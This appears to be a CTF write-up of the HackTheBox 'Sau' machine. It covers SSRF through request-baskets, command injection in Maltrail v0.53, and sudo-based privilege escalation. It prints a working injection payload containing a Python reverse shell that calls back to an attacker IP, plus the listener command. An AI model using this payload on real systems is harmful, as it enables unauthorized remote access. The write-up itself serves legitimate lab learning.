---
layout: post
status: publish
published: true
title: Sau Machine 
author: horus
categories: [CTF]
tags: [CTF,HackTheBox,Easy]
comments: true
image: Sau.png
---

###     …  بِسْمِ اللَّـهِ الرَّحْمَـٰنِ الرَّحِيمِ  …


## Introduction : 
Hello, I hope you are doing well. HackTheBox has published a machine called `Sau`. It is an easy machine , and we will solve it today together. I hope you enjoy the walkthrough.

DIFFICULTY : `Easy` 

OPERATING SYSTEM : `Linux`

IP:`10.129.22.167`

## Improved Topics : 
- Enumeration
- ssrf

## Used tools : 
- nmap

---
## Enumeration : 

The first thing that i did it is scanning the machine using nmap to discover the open ports using this command `nmap -v -sC -sV -oA nmap.txt 10.129.22.167` i have found three ports are opened 
```
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp    filtered http
55555/tcp open     unknown
```
i tried to visit the `80` port but it didn't give me a response , so i tried to visit the `55555` port and this interface showed up ![](/assets/images/Pasted%20image%2020230710054010.png)
i tried to search for CVES for `requests-baskets` and i didn't found any thing .

---
## Exploitation: 
i started testing the `create basket` function , i have entered a name then clicked create then i access the basket that i have created ![](/assets/images/Pasted%20image%2020230710091101.png)
i opened the configuration settings and i discovered that i can redirect the incoming request to the basket to another address so itried to put the local address with the port `80` that we discovered it early and cannot access it  ![](/assets/images/Pasted%20image%2020230710091406.png)
then i visited the basket link and it redirected me to the site with the port `80` .
the site was running by product called **M**altrail (v**0.53**) and have a login page 
![](/assets/images/Pasted%20image%2020230710101310.png)
then i searched for CVES for this product version and i have found that it is vulnerable with a command injection Vulnerability (https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/)

after i had read the report i copied the payload the edit on it to give me the reverse shell and this was the payload :
```sh
;`export RHOST="10.10.16.28";export RPORT=6666;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'`
```
i have tried many payloads to get the reverse shell from this site [https://www.revshells.com/ ]
bug nothing worked for me except this python3 payload , then i putted this above payload in the username parameter and prepared my reverse shell receiver on my machine using this command `pwncat-cs -lp 4444` pwncat is very good tool to do this job 

after i have submitted the request i received the connection back from the targeted machine ![](/assets/images/Pasted%20image%2020230710095716.png)
then i have got the user flag 
![](/assets/images/Pasted%20image%2020230710095824.png)

---
## Privilege Escalation : 
the first thing i did it after i have gained the shell is trying to see what is the commands that i can execute by root privilege , to see this commands we need to execute this command `sudo -l`
![](/assets/images/Pasted%20image%2020230710100146.png)
i searched for this on google and i have found this tow articles 
(https://www.cybersecurity-help.cz/vdb/SB2023032869)
(https://medium.com/@zenmoviefornotification/saidov-maxim-cve-2023-26604-c1232a526ba7)
i had read the articles , then i got in the shell to try to exploit this cve 
![](/assets/images/Pasted%20image%2020230710100646.png)
....We have got the root flag ladies and gentlemen .  
i hope you have enjoyed the Walkthrough